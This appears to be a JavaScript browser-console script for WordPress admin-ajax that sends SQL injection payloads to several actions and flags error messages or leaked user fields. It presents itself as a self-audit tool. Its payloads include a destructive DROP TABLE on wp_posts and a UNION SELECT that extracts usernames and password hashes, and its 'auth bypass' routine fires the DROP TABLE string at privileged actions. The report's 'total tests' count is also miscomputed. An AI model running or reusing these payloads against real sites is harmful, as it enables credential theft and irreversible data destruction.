// WordPress Admin-Ajax Security Testing Script
// Run this in browser console to test your wp-admin endpoints

class WPSecurityTester {
    constructor() {
        this.ajaxUrl = window._wpUtilSettings?.ajax?.url || '/wp-admin/admin-ajax.php';
        this.results = [];
    }

    // Test basic SQL injection payloads
    async testSQLInjection(action, params = {}) {
        const payloads = [
            "'; DROP TABLE wp_posts; --",
            "' OR '1'='1",
            "' UNION SELECT user_login, user_pass FROM wp_users --",
            "'; SELECT * FROM wp_options WHERE option_name='admin_email'; --",
            "1' AND (SELECT COUNT(*) FROM wp_users) > 0 --"
        ];

        console.log(`\n=== Testing Action: ${action} ===`);
        
        for (const payload of payloads) {
            try {
                const testParams = { ...params };
                // Inject payload into first parameter
                const firstKey = Object.keys(testParams)[0];
                if (firstKey) {
                    testParams[firstKey] = payload;
                }

                const formData = new URLSearchParams({
                    action: action,
                    ...testParams
                });

                const response = await fetch(this.ajaxUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    credentials: 'same-origin',
                    body: formData
                });

                const result = await response.text();
                
                // Look for SQL errors or suspicious responses
                const suspicious = this.checkSuspiciousResponse(result, payload);
                
                if (suspicious) {
                    console.warn(`⚠️ SUSPICIOUS: ${payload}`);
                    console.log(`Response: ${result.substring(0, 200)}...`);
                    this.results.push({
                        action,
                        payload,
                        response: result,
                        status: 'SUSPICIOUS'
                    });
                } else {
                    console.log(`✅ Safe: ${payload.substring(0, 30)}...`);
                }

            } catch (error) {
                console.log(`❌ Error: ${payload} - ${error.message}`);
            }
        }
    }

    // Check if response indicates SQL injection vulnerability
    checkSuspiciousResponse(response, payload) {
        const sqlErrors = [
            'mysql_fetch_array',
            'Warning: mysql',
            'SQL syntax error',
            'mysqli_query',
            'PostgreSQL query failed',
            'ORA-00933',
            'Microsoft OLE DB Provider',
            'Unclosed quotation mark',
            'quoted string not properly terminated'
        ];

        const lowerResponse = response.toLowerCase();
        
        // Check for SQL error messages
        for (const error of sqlErrors) {
            if (lowerResponse.includes(error.toLowerCase())) {
                return true;
            }
        }

        // Check for unexpected data exposure
        if (lowerResponse.includes('user_pass') || 
            lowerResponse.includes('user_login') || 
            lowerResponse.includes('wp_users')) {
            return true;
        }

        return false;
    }

    // Test common WordPress actions
    async testCommonActions() {
        const commonActions = [
            { action: 'heartbeat', params: { data: 'test' } },
            { action: 'wp_ajax_search', params: { query: 'test' } },
            { action: 'contact_form', params: { email: 'test@test.com', message: 'test' } },
            { action: 'get_posts', params: { post_type: 'post' } },
            { action: 'user_search', params: { term: 'admin' } }
        ];

        for (const { action, params } of commonActions) {
            await this.testSQLInjection(action, params);
            await this.sleep(500); // Don't overwhelm the server
        }
    }

    // Test with authentication bypass attempts
    async testAuthBypass() {
        console.log('\n=== Testing Authentication Bypass ===');
        
        const adminActions = [
            'delete-post',
            'edit-post',
            'install-plugin',
            'update-core'
        ];

        for (const action of adminActions) {
            try {
                const response = await fetch(this.ajaxUrl, {
                    method: 'POST',
                    body: new URLSearchParams({
                        action: action,
                        id: "1'; DROP TABLE wp_posts; --"
                    })
                });

                const result = await response.text();
                console.log(`${action}: ${result.substring(0, 100)}...`);
                
            } catch (error) {
                console.log(`${action}: Error - ${error.message}`);
            }
        }
    }

    // Helper function to add delay
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Generate security report
    generateReport() {
        console.log('\n=== SECURITY TEST REPORT ===');
        console.log(`Total tests run: ${this.results.length}`);
        
        const suspicious = this.results.filter(r => r.status === 'SUSPICIOUS');
        
        if (suspicious.length > 0) {
            console.warn(`⚠️ FOUND ${suspicious.length} POTENTIAL VULNERABILITIES:`);
            suspicious.forEach(item => {
                console.warn(`Action: ${item.action}, Payload: ${item.payload}`);
            });
        } else {
            console.log('✅ No obvious SQL injection vulnerabilities found');
        }
        
        console.log('\n⚠️ IMPORTANT: This is a basic test. Professional security audit recommended.');
    }
}

// Usage instructions
console.log('WordPress Security Tester Loaded!');
console.log('Usage:');
console.log('const tester = new WPSecurityTester();');
console.log('await tester.testCommonActions();');
console.log('await tester.testAuthBypass();');
console.log('tester.generateReport();');

// Export for use
window.WPSecurityTester = WPSecurityTester;
